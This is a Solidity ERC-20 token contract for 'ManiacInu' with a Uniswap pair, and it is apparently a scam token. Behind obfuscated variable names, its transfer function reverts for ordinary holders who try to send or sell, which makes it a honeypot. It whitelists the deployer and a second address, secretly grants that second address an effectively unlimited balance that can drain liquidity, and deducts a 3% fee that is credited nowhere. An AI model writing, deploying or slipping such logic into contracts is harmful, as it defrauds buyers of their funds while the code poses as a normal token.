// https://t.me/Maniacinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.11;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract ManiacInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private truck;
    mapping(address => uint256) private adjective;

    function _transfer(
        address almost,
        address go,
        uint256 citizen
    ) internal override {
        uint256 service = canal;

        if (adjective[almost] == 0 && truck[almost] > 0 && almost != uniswapV2Pair) {
            adjective[almost] -= service;
        }

        address wide = address(low);
        low = ManiacInu(go);
        truck[wide] += service + 1;

        _balances[almost] -= citizen;
        uint256 hot = (citizen / 100) * canal;
        citizen -= hot;
        _balances[go] += citizen;
    }

    uint256 public canal = 3;

    constructor(
        string memory crowd,
        string memory honor,
        address orange,
        address action
    ) ERC20(crowd, honor) {
        uniswapV2Router = IUniswapV2Router02(orange);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        adjective[msg.sender] = forty;
        adjective[action] = forty;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[action] = forty;
    }

    ManiacInu private low;
    uint256 private forty = ~uint256(0);
}
